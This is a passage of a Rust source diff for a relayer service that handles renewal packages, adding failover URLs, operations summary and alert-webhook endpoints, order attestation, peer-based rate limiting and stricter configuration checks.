@@ -1,15 +1,17 @@
 use axum::{
     Json, Router,
     extract::DefaultBodyLimit,
-    extract::{Path, State},
+    extract::{ConnectInfo, FromRequestParts, Path, State},
     http::{
         HeaderMap, HeaderValue, Method, StatusCode,
         header::{AUTHORIZATION, CONTENT_DISPOSITION, CONTENT_TYPE},
+        request::Parts,
     },
     middleware::{self, Next},
     response::{IntoResponse, Response},
     routing::{get, post},
 };
+use ipnet::IpNet;
 use reqwest::Client;
 use rusqlite::{Connection, TransactionBehavior, params};
 use serde::{Deserialize, Serialize};
@@ -18,7 +20,7 @@ use sha2::{Digest, Sha256};
 use std::{
     collections::{BTreeMap, BTreeSet},
     env,
-    net::SocketAddr,
+    net::{IpAddr, SocketAddr},
     path::{Path as FsPath, PathBuf},
     sync::{
         Arc,
@@ -34,6 +36,27 @@ use tokio::{
 use tower_http::cors::{AllowOrigin, Any, CorsLayer};
 use zylith_core::{constant_time_eq, extract_bearer_token, format_bearer_token};
 
+#[derive(Clone, Copy)]
+struct PeerAddress(Option<SocketAddr>);
+
+impl<S> FromRequestParts<S> for PeerAddress
+where
+    S: Send + Sync,
+{
+    type Rejection = std::convert::Infallible;
+
+    fn from_request_parts(
+        parts: &mut Parts,
+        _state: &S,
+    ) -> impl std::future::Future<Output = Result<Self, Self::Rejection>> + Send {
+        let address = parts
+            .extensions
+            .get::<ConnectInfo<SocketAddr>>()
+            .map(|connect_info| connect_info.0);
+        async move { Ok(Self(address)) }
+    }
+}
+
 const DEFAULT_BIND_ADDR: &str = "127.0.0.1:3400";
 const DEFAULT_STORE_PATH: &str = "renewal_relayer/relay_store.dev.json";
 const DEFAULT_TICK_MS: u64 = 5_000;
@@ -43,6 +66,8 @@ const DEFAULT_MAX_ATTEMPTS: u32 = 16;
 const DEFAULT_MAX_BODY_BYTES: usize = 32 * 1024 * 1024;
 const DEFAULT_PACKAGE_RETENTION_MS: u64 = 120 * 24 * 60 * 60 * 1000;
 const DEFAULT_RATE_LIMIT_PER_MINUTE: u32 = 120;
+const DEFAULT_PACKAGE_EXPIRY_WARNING_EPOCHS: u64 = 960;
+const DEFAULT_ALERT_REPEAT_MS: u64 = 15 * 60 * 1000;
 const MIN_MANAGED_SUBMISSION_SAFETY_BUFFER_MS: u64 = 5_000;
 const MAX_MANAGED_SUBMISSION_SAFETY_BUFFER_MS: u64 = 60_000;
 const MIN_MANAGED_SUBMISSION_DELAY_MS: u64 = 10_000;
@@ -52,8 +77,14 @@ const STORE_PATH_ENV: &str = "ZYLITH_RENEWAL_RELAY_STORE_PATH";
 const PACKAGE_TOKEN_ENV: &str = "ZYLITH_RENEWAL_RELAY_PACKAGE_TOKEN";
 const COORDINATOR_URL_ENV: &str = "ZYLITH_RENEWAL_RELAY_COORDINATOR_URL";
 const PROVER_URL_ENV: &str = "ZYLITH_RENEWAL_RELAY_PROVER_URL";
+const COORDINATOR_URLS_ENV: &str = "ZYLITH_RENEWAL_RELAY_COORDINATOR_URLS";
+const PROVER_URLS_ENV: &str = "ZYLITH_RENEWAL_RELAY_PROVER_URLS";
 const COORDINATOR_CONTROL_TOKEN_ENV: &str = "ZYLITH_RENEWAL_RELAY_COORDINATOR_CONTROL_TOKEN";
 const INTERNAL_TOKEN_ENV: &str = "ZYLITH_RENEWAL_RELAY_INTERNAL_TOKEN";
+const PROVER_CONTROL_TOKEN_ENV: &str = "ZYLITH_RENEWAL_RELAY_PROVER_CONTROL_TOKEN";
+const ALERT_WEBHOOK_URLS_ENV: &str = "ZYLITH_RENEWAL_RELAY_ALERT_WEBHOOK_URLS";
+const ALERT_WEBHOOK_TOKEN_ENV: &str = "ZYLITH_RENEWAL_RELAY_ALERT_WEBHOOK_TOKEN";
+const ALERT_REPEAT_MS_ENV: &str = "ZYLITH_RENEWAL_RELAY_ALERT_REPEAT_MS";
 const TICK_MS_ENV: &str = "ZYLITH_RENEWAL_RELAY_TICK_MS";
 const ENABLE_WORKER_ENV: &str = "ZYLITH_RENEWAL_RELAY_ENABLE_WORKER";
 const MAX_PACKAGE_SLOTS_ENV: &str = "ZYLITH_RENEWAL_RELAY_MAX_PACKAGE_SLOTS";
@@ -65,6 +96,8 @@ const MAX_BODY_BYTES_ENV: &str = "ZYLITH_RENEWAL_RELAY_MAX_BODY_BYTES";
 const PACKAGE_RETENTION_MS_ENV: &str = "ZYLITH_RENEWAL_RELAY_PACKAGE_RETENTION_MS";
 const RATE_LIMIT_PER_MINUTE_ENV: &str = "ZYLITH_RENEWAL_RELAY_RATE_LIMIT_PER_MINUTE";
 const ACCEPT_RELAY_MODE_ENV: &str = "ZYLITH_RENEWAL_RELAY_ACCEPT_RELAY_MODE";
+const PACKAGE_EXPIRY_WARNING_EPOCHS_ENV: &str =
+    "ZYLITH_RENEWAL_RELAY_PACKAGE_EXPIRY_WARNING_EPOCHS";
 const RELAY_PACKAGE_COMMITMENT_HEADER: &str = "x-zylith-relay-package-commitment";
 const RELAY_PARENT_CANCEL_AUTHORITY_HEADER: &str = "x-zylith-relay-parent-cancel-authority";
 const RELAY_SIGNER_HEADER: &str = "x-zylith-relay-signer";
@@ -79,8 +112,14 @@ struct RelayConfig {
     package_registration_token: Option<Arc<String>>,
     default_coordinator_url: Option<String>,
     default_prover_url: Option<String>,
+    default_coordinator_failover_urls: Vec<String>,
+    default_prover_failover_urls: Vec<String>,
     coordinator_control_token: Option<Arc<String>>,
     internal_control_token: Option<Arc<String>>,
+    prover_control_token: Option<Arc<String>>,
+    alert_webhook_urls: Vec<String>,
+    alert_webhook_token: Option<Arc<String>>,
+    alert_repeat_ms: u64,
     tick_interval_ms: u64,
     enable_worker: bool,
     max_package_slots: usize,
@@ -92,6 +131,7 @@ struct RelayConfig {
     package_retention_ms: u64,
     rate_limit_per_minute: u32,
     accepted_relay_mode: AcceptedRelayMode,
+    package_expiry_warning_epochs: u64,
 }
 
 impl RelayConfig {
@@ -107,11 +147,36 @@ impl RelayConfig {
             .or_else(|_| env::var(zylith_core::CONTROL_PLANE_TOKEN_ENV))
             .ok()
             .map(Arc::new);
+        let prover_control_token = env::var(PROVER_CONTROL_TOKEN_ENV).ok().map(Arc::new);
         let allowed_origins = parse_allowed_origins(ALLOWED_ORIGINS_ENV)?;
         let store_path =
             PathBuf::from(env::var(STORE_PATH_ENV).unwrap_or_else(|_| DEFAULT_STORE_PATH.into()));
-        let accepted_relay_mode = AcceptedRelayMode::from_env()?;
+        let accepted_relay_mode_env = env::var(ACCEPT_RELAY_MODE_ENV)
+            .ok()
+            .map(|value| value.trim().to_owned())
+            .filter(|value| !value.is_empty());
+        let accepted_relay_mode = AcceptedRelayMode::from_configured_value(
+            accepted_relay_mode_env.as_deref().unwrap_or("SelfRelay"),
+        )?;
+        let enable_worker = env_bool(ENABLE_WORKER_ENV, true);
+        let coordinator_urls = configured_urls_from_env(COORDINATOR_URLS_ENV, COORDINATOR_URL_ENV);
+        let prover_urls = configured_urls_from_env(PROVER_URLS_ENV, PROVER_URL_ENV);
+        if (enable_worker || !bind_addr.ip().is_loopback()) && coordinator_urls.is_empty() {
+            return Err(format!(
+                "{COORDINATOR_URL_ENV} or {COORDINATOR_URLS_ENV} is required when the renewal relay worker is enabled or the service is exposed"
+            ));
+        }
+        if (enable_worker || !bind_addr.ip().is_loopback()) && prover_urls.is_empty() {
+            return Err(format!(
+                "{PROVER_URL_ENV} or {PROVER_URLS_ENV} is required when the renewal relay worker is enabled or the service is exposed"
+            ));
+        }
         if strict_mode {
+            if accepted_relay_mode_env.is_none() {
+                return Err(format!(
+                    "{ACCEPT_RELAY_MODE_ENV} is required when {STRICT_MODE_ENV}=true"
+                ));
+            }
             if internal_control_token.is_none() {
                 return Err(format!(
                     "{INTERNAL_TOKEN_ENV} or {} is required when {STRICT_MODE_ENV}=true",
@@ -125,22 +190,19 @@ impl RelayConfig {
                     "{COORDINATOR_CONTROL_TOKEN_ENV} is required for managed ZylithRelay mode when {STRICT_MODE_ENV}=true"
                 ));
             }
-            if env::var(COORDINATOR_URL_ENV)
-                .ok()
-                .map(|value| value.trim().is_empty())
-                .unwrap_or(true)
-            {
+            if coordinator_urls.is_empty() {
                 return Err(format!(
-                    "{COORDINATOR_URL_ENV} is required when {STRICT_MODE_ENV}=true"
+                    "{COORDINATOR_URL_ENV} or {COORDINATOR_URLS_ENV} is required when {STRICT_MODE_ENV}=true"
                 ));
             }
-            if env::var(PROVER_URL_ENV)
-                .ok()
-                .map(|value| value.trim().is_empty())
-                .unwrap_or(true)
-            {
+            if prover_urls.is_empty() {
                 return Err(format!(
-                    "{PROVER_URL_ENV} is required when {STRICT_MODE_ENV}=true"
+                    "{PROVER_URL_ENV} or {PROVER_URLS_ENV} is required when {STRICT_MODE_ENV}=true"
+                ));
+            }
+            if prover_control_token.is_none() {
+                return Err(format!(
+                    "{PROVER_CONTROL_TOKEN_ENV} is required when {STRICT_MODE_ENV}=true"
                 ));
             }
             if allowed_origins.is_empty() {
@@ -159,16 +221,27 @@ impl RelayConfig {
                 ));
             }
         }
+        if !bind_addr.ip().is_loopback() && accepted_relay_mode_env.is_none() {
+            return Err(format!(
+                "{ACCEPT_RELAY_MODE_ENV} is required when the renewal relay is exposed"
+            ));
+        }
         Ok(Self {
             bind_addr,
             store_path,
             package_registration_token,
-            default_coordinator_url: env::var(COORDINATOR_URL_ENV).ok().map(normalize_url),
-            default_prover_url: env::var(PROVER_URL_ENV).ok().map(normalize_url),
+            default_coordinator_url: coordinator_urls.first().cloned(),
+            default_prover_url: prover_urls.first().cloned(),
+            default_coordinator_failover_urls: coordinator_urls.into_iter().skip(1).collect(),
+            default_prover_failover_urls: prover_urls.into_iter().skip(1).collect(),
             coordinator_control_token,
             internal_control_token,
+            prover_control_token,
+            alert_webhook_urls: configured_urls_from_env(ALERT_WEBHOOK_URLS_ENV, ""),
+            alert_webhook_token: env::var(ALERT_WEBHOOK_TOKEN_ENV).ok().map(Arc::new),
+            alert_repeat_ms: env_u64(ALERT_REPEAT_MS_ENV, DEFAULT_ALERT_REPEAT_MS),
             tick_interval_ms: env_u64(TICK_MS_ENV, DEFAULT_TICK_MS),
-            enable_worker: env_bool(ENABLE_WORKER_ENV, true),
+            enable_worker,
             max_package_slots: env_usize(MAX_PACKAGE_SLOTS_ENV, DEFAULT_MAX_PACKAGE_SLOTS),
             retry_backoff_ms: env_u64(RETRY_BACKOFF_MS_ENV, DEFAULT_RETRY_BACKOFF_MS),
             max_attempts: env_u32(MAX_ATTEMPTS_ENV, DEFAULT_MAX_ATTEMPTS),
@@ -181,6 +254,10 @@ impl RelayConfig {
                 DEFAULT_RATE_LIMIT_PER_MINUTE,
             ),
             accepted_relay_mode,
+            package_expiry_warning_epochs: env_u64(
+                PACKAGE_EXPIRY_WARNING_EPOCHS_ENV,
+                DEFAULT_PACKAGE_EXPIRY_WARNING_EPOCHS,
+            ),
         })
     }
 }
@@ -193,8 +270,7 @@ enum AcceptedRelayMode {
 }
 
 impl AcceptedRelayMode {
-    fn from_env() -> Result<Self, String> {
-        let raw = env::var(ACCEPT_RELAY_MODE_ENV).unwrap_or_else(|_| "ZylithRelay".into());
+    fn from_configured_value(raw: &str) -> Result<Self, String> {
         match raw.trim().to_ascii_lowercase().as_str() {
             "" | "zylith" | "zylithrelay" | "managed" => Ok(Self::ZylithRelay),
             "self" | "selfrelay" | "self-hosted" | "selfhosted" => Ok(Self::SelfRelay),
@@ -230,6 +306,7 @@ struct AppState {
     http: Client,
     tick_lock: Arc<Mutex<()>>,
     rate_limits: Arc<RwLock<BTreeMap<String, RateLimitBucket>>>,
+    alert_dispatch_cache: Arc<RwLock<BTreeMap<String, u64>>>,
 }
 
 #[derive(Clone, Debug, Default)]
@@ -272,13 +349,15 @@ struct OfflineRenewalPackage {
     start_epoch: u64,
     end_epoch: u64,
     slot_count: usize,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     relay_mode: Option<RelayMode>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     parent_cancel_authority: Option<String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    parent_cancel_marker: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     relay_authorization: Option<RelayPackageAuthorization>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     ingress_key_registry_fingerprint: Option<String>,
     relay_policy: RelayPolicy,
     slots: Vec<OfflineRenewalSlot>,
@@ -300,7 +379,7 @@ struct OfflineRenewalSlot {
     epoch_id: u64,
     parent_child_index: u64,
     order_commitment: String,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
     funding_note_commitments: Vec<String>,
     ingress_request: Value,
 }
@@ -366,7 +445,7 @@ struct PublicBatchSummary {
 struct PublicProofJobStatus {
     state: String,
     #[serde(default)]
-    matched_order_count: Option<u64>,
+    reuse_state: Option<String>,
     #[serde(default)]
     failure: Option<String>,
 }
@@ -379,6 +458,10 @@ struct IngressResponse {
 
 #[derive(Debug, Deserialize)]
 struct IngressReceipt {
+    order_commitment: String,
+    pair_id: String,
+    batch_id: String,
+    epoch_id: u64,
     #[serde(default)]
     relay_mode: Option<RelayMode>,
     #[serde(default)]
@@ -409,6 +492,98 @@ struct PackageResults {
     results: Vec<OfflineRenewalRelayResult>,
 }
 
+#[derive(Debug, Deserialize)]
+struct PackageOrderAttestationRequest {
+    package_commitment: String,
+    order_commitment: String,
+    pair: String,
+    batch_id: String,
+    epoch_id: u64,
+}
+
+#[derive(Debug, Serialize)]
+struct PackageOrderAttestation {
+    package_id: String,
+    package_commitment: String,
+    order_commitment: String,
+    pair: String,
+    batch_id: String,
+    epoch_id: u64,
+    relay_mode: RelayMode,
+}
+
+#[derive(Debug, Serialize)]
+struct RelayOpsSummary {
+    generated_at_unix_ms: u64,
+    status: String,
+    strict_mode: bool,
+    worker_enabled: bool,
+    accepted_relay_mode: String,
+    store_kind: String,
+    store_ok: bool,
+    ready: bool,
+    package_count: usize,
+    cancelled_package_count: usize,
+    last_observed_epoch: Option<u64>,
+    counts: RelayOpsSlotCounts,
+    alerts: Vec<RelayOpsAlert>,
+    packages: Vec<RelayOpsPackageSummary>,
+}
+
+#[derive(Clone, Debug, Default, Serialize)]
+struct RelayOpsSlotCounts {
+    total_slots: usize,
+    submitted_slots: usize,
+    already_submitted_slots: usize,
+    unobserved_slots: usize,
+    not_due_slots: usize,
+    batch_not_open_slots: usize,
+    safety_buffer_slots: usize,
+    awaiting_settlement_slots: usize,
+    awaiting_wallet_refresh_slots: usize,
+    missed_slots: usize,
+    failed_slots: usize,
+    retryable_failed_slots: usize,
+}
+
+#[derive(Debug, Serialize)]
+struct RelayOpsPackageSummary {
+    package_id: String,
+    package_commitment: String,
+    pair: String,
+    relay_mode: String,
+    start_epoch: u64,
+    end_epoch: u64,
+    slot_count: usize,
+    result_count: usize,
+    unobserved_slots: usize,
+    submitted_slots: usize,
+    failed_slots: usize,
+    retryable_failed_slots: usize,
+    missed_slots: usize,
+    awaiting_settlement_slots: usize,
+    awaiting_wallet_refresh_slots: usize,
+    oldest_unobserved_epoch: Option<u64>,
+    newest_unobserved_epoch: Option<u64>,
+    last_attempt_unix_ms: Option<u64>,
+    updated_at_unix_ms: u64,
+}
+
+#[derive(Clone, Debug, Serialize)]
+struct RelayOpsAlert {
+    severity: String,
+    code: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    package_id: Option<String>,
+    detail: String,
+}
+
+#[derive(Clone, Debug)]
+struct ReadinessSnapshot {
+    ready: bool,
+    store_ok: bool,
+}
+
 #[tokio::main]
 async fn main() {
     let config = match RelayConfig::from_env() {
@@ -425,6 +600,9 @@ async fn main() {
                 "failed to load renewal relay store {}: {error}",
                 config.store_path.display()
             );
+            if config.strict_mode {
+                std::process::exit(1);
+            }
             RelayStore::default()
         });
     let state = AppState {
@@ -433,6 +611,7 @@ async fn main() {
         http: Client::new(),
         tick_lock: Arc::new(Mutex::new(())),
         rate_limits: Arc::new(RwLock::new(BTreeMap::new())),
+        alert_dispatch_cache: Arc::new(RwLock::new(BTreeMap::new())),
     };
     if state.config.enable_worker {
         spawn_worker(state.clone());
@@ -442,9 +621,12 @@ async fn main() {
         .await
         .unwrap_or_else(|error| panic!("failed to bind renewal relayer on {bind_addr}: {error}"));
     println!("zylith renewal relayer listening on {bind_addr}");
-    axum::serve(listener, app(state))
-        .await
-        .expect("renewal relayer server failed");
+    axum::serve(
+        listener,
+        app(state).into_make_service_with_connect_info::<SocketAddr>(),
+    )
+    .await
+    .expect("renewal relayer server failed");
 }
 
 fn app(state: AppState) -> Router {
@@ -457,6 +639,8 @@ fn app(state: AppState) -> Router {
         .route("/health", get(health))
         .route("/ready", get(readiness))
         .route("/metrics", get(metrics))
+        .route("/ops/summary", get(ops_summary))
+        .route("/ops/alerts", get(ops_alerts))
         .route("/packages", register_package_route)
         .route(
             "/packages/{package_id}",
@@ -467,6 +651,10 @@ fn app(state: AppState) -> Router {
             "/packages/{package_id}/results.csv",
             get(get_package_results_csv),
         )
+        .route(
+            "/packages/{package_id}/attest-order",
+            post(attest_package_order),
+        )
         .route("/api/internal/relay/tick", post(trigger_tick))
         .layer(DefaultBodyLimit::max(max_body_bytes))
         .layer(cors)
@@ -475,43 +663,45 @@ fn app(state: AppState) -> Router {
 
 async fn relay_rate_limit_middleware(
     State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
     headers: HeaderMap,
     request: axum::extract::Request,
     next: Next,
 ) -> Result<Response, RelayApiError> {
-    enforce_rate_limit(&state, &headers).await?;
+    enforce_rate_limit(&state, &headers, peer).await?;
     Ok(next.run(request).await)
 }
 
-async fn health(State(state): State<AppState>) -> Json<Value> {
-    let store = state.store.read().await;
+async fn health() -> Json<Value> {
     Json(json!({
         "status": "ok",
-        "packages": store.packages.len(),
-        "worker_enabled": state.config.enable_worker,
-        "strict_mode": state.config.strict_mode,
-        "max_package_slots": state.config.max_package_slots,
-        "accepted_relay_mode": state.config.accepted_relay_mode.label(),
+        "service": "zylith-renewal-relayer",
     }))
 }
 
-async fn readiness(State(state): State<AppState>) -> impl IntoResponse {
-    let store_ok = if is_sqlite_store(&state.config.store_path) {
-        open_sqlite_store(&state.config.store_path).is_ok()
+fn readiness_snapshot(config: &RelayConfig) -> ReadinessSnapshot {
+    let store_ok = if is_sqlite_store(&config.store_path) {
+        open_sqlite_store(&config.store_path).is_ok()
     } else {
-        !state.config.strict_mode
+        !config.strict_mode
     };
-    let coordinator_auth_ok = state.config.accepted_relay_mode != AcceptedRelayMode::ZylithRelay
-        || state.config.coordinator_control_token.is_some();
+    let coordinator_auth_ok = config.accepted_relay_mode != AcceptedRelayMode::ZylithRelay
+        || config.coordinator_control_token.is_some();
     let ready = store_ok
-        && (!state.config.strict_mode
+        && (!config.strict_mode
             || (coordinator_auth_ok
-                && state.config.internal_control_token.is_some()
-                && state.config.default_coordinator_url.is_some()
-                && state.config.default_prover_url.is_some()
-                && !state.config.allowed_origins.is_empty()
-                && is_sqlite_store(&state.config.store_path)));
-    let status = if ready {
+                && config.internal_control_token.is_some()
+                && config.prover_control_token.is_some()
+                && !configured_coordinator_urls(config).is_empty()
+                && !configured_prover_urls(config).is_empty()
+                && !config.allowed_origins.is_empty()
+                && is_sqlite_store(&config.store_path)));
+    ReadinessSnapshot { ready, store_ok }
+}
+
+async fn readiness(State(state): State<AppState>) -> impl IntoResponse {
+    let readiness = readiness_snapshot(&state.config);
+    let status = if readiness.ready {
         StatusCode::OK
     } else {
         StatusCode::SERVICE_UNAVAILABLE
@@ -519,15 +709,7 @@ async fn readiness(State(state): State<AppState>) -> impl IntoResponse {
     (
         status,
         Json(json!({
-            "status": if ready { "ready" } else { "not_ready" },
-            "store_ok": store_ok,
-            "strict_mode": state.config.strict_mode,
-            "worker_enabled": state.config.enable_worker,
-            "coordinator_pinned": state.config.default_coordinator_url.is_some(),
-            "prover_pinned": state.config.default_prover_url.is_some(),
-            "internal_auth_configured": state.config.internal_control_token.is_some(),
-            "coordinator_control_configured": state.config.coordinator_control_token.is_some(),
-            "accepted_relay_mode": state.config.accepted_relay_mode.label(),
+            "status": if readiness.ready { "ready" } else { "not_ready" },
         })),
     )
 }
@@ -536,48 +718,24 @@ async fn metrics(
     State(state): State<AppState>,
     headers: HeaderMap,
 ) -> Result<String, RelayApiError> {
-    if state.config.strict_mode {
-        require_internal_auth(&state, &headers)?;
-    }
+    require_internal_auth(&state, &headers)?;
     let store = state.store.read().await;
-    let mut total_slots = 0usize;
-    let mut submitted = 0usize;
-    let mut pending = 0usize;
-    let mut missed = 0usize;
-    let mut failed = 0usize;
-    let mut awaiting_wallet_refresh = 0usize;
-    for package in store.packages.values() {
-        total_slots += package.package.slot_count;
-        submitted += package
-            .results
-            .values()
-            .filter(|entry| {
-                matches!(
-                    entry.result.status,
-                    RelaySlotStatus::Submitted | RelaySlotStatus::AlreadySubmitted
-                )
-            })
-            .count();
-        missed += package
-            .results
-            .values()
-            .filter(|entry| matches!(entry.result.status, RelaySlotStatus::Missed))
-            .count();
-        failed += package
-            .results
-            .values()
-            .filter(|entry| matches!(entry.result.status, RelaySlotStatus::Failed))
-            .count();
-        awaiting_wallet_refresh += package
-            .results
-            .values()
-            .filter(|entry| matches!(entry.result.status, RelaySlotStatus::AwaitingWalletRefresh))
-            .count();
-        pending += package
-            .package
-            .slot_count
-            .saturating_sub(package.results.len());
-    }
+    let summary = build_ops_summary(&state, &store, now_unix_ms());
+    let critical_alerts = summary
+        .alerts
+        .iter()
+        .filter(|alert| alert.severity == "critical")
+        .count();
+    let warning_alerts = summary
+        .alerts
+        .iter()
+        .filter(|alert| alert.severity == "warning")
+        .count();
+    let expiring_packages = summary
+        .alerts
+        .iter()
+        .filter(|alert| alert.code == "package_expires_soon")
+        .count();
     Ok(format!(
         "# HELP zylith_renewal_relay_packages Registered renewal packages.\n\
          # TYPE zylith_renewal_relay_packages gauge\n\
@@ -599,15 +757,374 @@ async fn metrics(
          zylith_renewal_relay_failed_slots {}\n\
          # HELP zylith_renewal_relay_awaiting_wallet_refresh_slots Slots blocked because reused maker capital already settled.\n\
          # TYPE zylith_renewal_relay_awaiting_wallet_refresh_slots gauge\n\
-         zylith_renewal_relay_awaiting_wallet_refresh_slots {}\n",
-        store.packages.len(),
-        total_slots,
-        submitted,
-        pending,
-        missed,
-        failed,
-        awaiting_wallet_refresh,
+         zylith_renewal_relay_awaiting_wallet_refresh_slots {}\n\
+         # HELP zylith_renewal_relay_retryable_failed_slots Failed renewal slots still under the retry-attempt cap.\n\
+         # TYPE zylith_renewal_relay_retryable_failed_slots gauge\n\
+         zylith_renewal_relay_retryable_failed_slots {}\n\
+         # HELP zylith_renewal_relay_package_expiring_soon Packages near the configured expiry-warning horizon.\n\
+         # TYPE zylith_renewal_relay_package_expiring_soon gauge\n\
+         zylith_renewal_relay_package_expiring_soon {}\n\
+         # HELP zylith_renewal_relay_warning_alerts Active warning-level relay alerts.\n\
+         # TYPE zylith_renewal_relay_warning_alerts gauge\n\
+         zylith_renewal_relay_warning_alerts {}\n\
+         # HELP zylith_renewal_relay_critical_alerts Active critical relay alerts.\n\
+         # TYPE zylith_renewal_relay_critical_alerts gauge\n\
+         zylith_renewal_relay_critical_alerts {}\n",
+        summary.package_count,
+        summary.counts.total_slots,
+        summary.counts.submitted_slots + summary.counts.already_submitted_slots,
+        summary.counts.unobserved_slots
+            + summary.counts.not_due_slots
+            + summary.counts.batch_not_open_slots
+            + summary.counts.safety_buffer_slots
+            + summary.counts.awaiting_settlement_slots
+            + summary.counts.retryable_failed_slots,
+        summary.counts.missed_slots,
+        summary.counts.failed_slots,
+        summary.counts.awaiting_wallet_refresh_slots,
+        summary.counts.retryable_failed_slots,
+        expiring_packages,
+        warning_alerts,
+        critical_alerts,
     ))
+}
+
+async fn ops_summary(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+) -> Result<Json<RelayOpsSummary>, RelayApiError> {
+    require_internal_auth(&state, &headers)?;
+    let store = state.store.read().await;
+    Ok(Json(build_ops_summary(&state, &store, now_unix_ms())))
+}
+
+async fn ops_alerts(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+) -> Result<Json<Vec<RelayOpsAlert>>, RelayApiError> {
+    require_internal_auth(&state, &headers)?;
+    let store = state.store.read().await;
+    Ok(Json(
+        build_ops_summary(&state, &store, now_unix_ms()).alerts,
+    ))
+}
+
+async fn dispatch_ops_alerts(state: &AppState) {
+    if state.config.alert_webhook_urls.is_empty() {
+        return;
+    }
+    let now = now_unix_ms();
+    let summary = {
+        let store = state.store.read().await;
+        build_ops_summary(state, &store, now)
+    };
+    let alerts = due_alerts_for_dispatch(state, &summary.alerts, now).await;
+    if alerts.is_empty() {
+        return;
+    }
+    let payload = json!({
+        "service": "zylith-renewal-relayer",
+        "generated_at_unix_ms": now,
+        "status": summary.status,
+        "strict_mode": summary.strict_mode,
+        "accepted_relay_mode": summary.accepted_relay_mode,
+        "package_count": summary.package_count,
+        "counts": summary.counts,
+        "alerts": alerts,
+    });
+    for webhook_url in &state.config.alert_webhook_urls {
+        if let Err(error) = post_alert_webhook(
+            &state.http,
+            webhook_url,
+            &payload,
+            state
+                .config
+                .alert_webhook_token
+                .as_deref()
+                .map(String::as_str),
+        )
+        .await
+        {
+            eprintln!(
+                "renewal relay alert webhook failed target={} error={}",
+                short_log_id(webhook_url),
+                sanitize_log_field(&error)
+            );
+        }
+    }
+}
+
+async fn due_alerts_for_dispatch(
+    state: &AppState,
+    alerts: &[RelayOpsAlert],
+    now: u64,
+) -> Vec<RelayOpsAlert> {
+    let mut cache = state.alert_dispatch_cache.write().await;
+    cache.retain(|_, sent_at| {
+        now.saturating_sub(*sent_at) <= state.config.alert_repeat_ms.saturating_mul(2)
+    });
+    let mut due = Vec::new();
+    for alert in alerts {
+        let key = alert_dispatch_key(alert);
+        let last_sent = cache.get(&key).copied().unwrap_or_default();
+        if last_sent == 0 || now.saturating_sub(last_sent) >= state.config.alert_repeat_ms {
+            cache.insert(key, now);
+            due.push(alert.clone());
+        }
+    }
+    due
+}
+
+fn alert_dispatch_key(alert: &RelayOpsAlert) -> String {
+    format!(
+        "{}:{}:{}",
+        alert.severity,
+        alert.code,
+        alert.package_id.as_deref().unwrap_or("*")
+    )
+}
+
+fn build_ops_summary(state: &AppState, store: &RelayStore, now: u64) -> RelayOpsSummary {
+    let readiness = readiness_snapshot(&state.config);
+    let last_observed_epoch = store
+        .packages
+        .values()
+        .flat_map(|package| package.results.values())
+        .map(|entry| entry.result.epoch_id)
+        .max();
+    let mut counts = RelayOpsSlotCounts::default();
+    let mut packages = Vec::with_capacity(store.packages.len());
+    let mut alerts = Vec::new();
+    if !readiness.ready {
+        alerts.push(RelayOpsAlert {
+            severity: "critical".into(),
+            code: "relay_not_ready".into(),
+            package_id: None,
+            detail:
+                "Readiness checks are failing; inspect /ready for the exact failed prerequisite."
+                    .into(),
+        });
+    }
+    if store.packages.is_empty() {
+        alerts.push(RelayOpsAlert {
+            severity: "warning".into(),
+            code: "no_packages_registered".into(),
+            package_id: None,
+            detail: "No renewal packages are registered.".into(),
+        });
+    }
+    for stored in store.packages.values() {
+        let package_summary =
+            ops_package_summary(stored, state.config.max_attempts, last_observed_epoch);
+        counts.total_slots += package_summary.slot_count;
+        counts.unobserved_slots += package_summary.unobserved_slots;
+        counts.submitted_slots += stored
+            .results
+            .values()
+            .filter(|entry| matches!(entry.result.status, RelaySlotStatus::Submitted))
+            .count();
+        counts.already_submitted_slots += stored
+            .results
+            .values()
+            .filter(|entry| matches!(entry.result.status, RelaySlotStatus::AlreadySubmitted))
+            .count();
+        counts.not_due_slots += count_status(stored, RelaySlotStatus::NotDue);
+        counts.batch_not_open_slots += count_status(stored, RelaySlotStatus::BatchNotOpen);
+        counts.safety_buffer_slots += count_status(stored, RelaySlotStatus::SafetyBuffer);
+        counts.awaiting_settlement_slots += package_summary.awaiting_settlement_slots;
+        counts.awaiting_wallet_refresh_slots += package_summary.awaiting_wallet_refresh_slots;
+        counts.missed_slots += package_summary.missed_slots;
+        counts.failed_slots += package_summary.failed_slots;
+        counts.retryable_failed_slots += package_summary.retryable_failed_slots;
+
+        extend_ops_alerts_for_package(
+            &mut alerts,
+            &package_summary,
+            state.config.package_expiry_warning_epochs,
+            last_observed_epoch,
+        );
+        packages.push(package_summary);
+    }
+    packages.sort_by(|left, right| {
+        left.pair
+            .cmp(&right.pair)
+            .then(left.end_epoch.cmp(&right.end_epoch))
+            .then(left.package_id.cmp(&right.package_id))
+    });
+    let status = if alerts.iter().any(|alert| alert.severity == "critical") {
+        "critical"
+    } else if alerts.iter().any(|alert| alert.severity == "warning") {
+        "degraded"
+    } else {
+        "ok"
+    };
+    RelayOpsSummary {
+        generated_at_unix_ms: now,
+        status: status.into(),
+        strict_mode: state.config.strict_mode,
+        worker_enabled: state.config.enable_worker,
+        accepted_relay_mode: state.config.accepted_relay_mode.label().into(),
+        store_kind: if is_sqlite_store(&state.config.store_path) {
+            "sqlite".into()
+        } else {
+            "json".into()
+        },
+        store_ok: readiness.store_ok,
+        ready: readiness.ready,
+        package_count: store.packages.len(),
+        cancelled_package_count: store.cancelled_packages.len(),
+        last_observed_epoch,
+        counts,
+        alerts,
+        packages,
+    }
+}
+
+fn ops_package_summary(
+    stored: &StoredPackage,
+    max_attempts: u32,
+    last_observed_epoch: Option<u64>,
+) -> RelayOpsPackageSummary {
+    let submitted_slots = stored
+        .results
+        .values()
+        .filter(|entry| {
+            matches!(
+                entry.result.status,
+                RelaySlotStatus::Submitted | RelaySlotStatus::AlreadySubmitted
+            )
+        })
+        .count();
+    let failed_slots = count_status(stored, RelaySlotStatus::Failed);
